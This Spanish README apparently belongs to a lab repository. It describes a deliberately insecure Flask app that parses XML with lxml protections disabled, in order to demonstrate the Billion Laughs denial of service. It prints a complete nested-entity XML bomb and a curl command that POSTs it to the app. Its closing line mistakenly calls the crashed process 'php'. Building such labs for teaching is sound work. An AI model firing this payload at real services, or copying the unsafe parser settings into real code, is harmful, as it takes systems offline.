# "Billion Laughs Attack" en Python - Flask

⚠️ **¡ESTE PROYECTO ES INTENCIONALMENTE INSEGURO!**

Este repositorio contiene un ejemplo **intencionalmente vulnerable** al ataque DoS [Billion Laughs](https://wh01s17.vercel.app/blog/Ciberseguridad/dos_-_billion_laughs_attack). Debe ser utilizado únicamente con fines educativos, pruebas de concepto y laboratorios controlados.

---

## Resumen
Aplicación Flask mínima que parsea XML utilizando `lxml` con protecciones desactivadas (`resolve_entities=True`, `no_network=False`, `huge_tree=True`) para ilustrar cómo funciona un ataque de *entity expansion* ([Billion Laughs](https://wh01s17.vercel.app/blog/Ciberseguridad/dos_-_billion_laughs_attack)). 

---

## Estructura
- `app.py` — servidor Flask vulnerable.  
- `requirements.txt` — dependencias (`Flask`, `lxml`).  
- `payload.xml` — payload con expansión de entidades XML.

---

## Requisitos
- Python 3.11+ (o la versión que uses).  
- `pip`.
- Recomendado: entorno virtual (`venv`) o Docker.

---

## Instalación (recomendada en `venv`)
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Ejecutar
```bash
python app.py
```

## Enviar bomba XML
Envía una solicitud POST a /api con un payload como el siguiente:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "x">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">
    <!ENTITY lol11 "&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;">
]>
<lolz>&lol11;</lolz>
```
Guarda el contenido de payload.xml y ejecuta:
```bash
curl -X POST http://TU_IP:8000/api -H "Content-Type: application/xml" --data-binary @payload.xml
```

La respuesta tomará mucho tiempo o provocará colapso del proceso php.
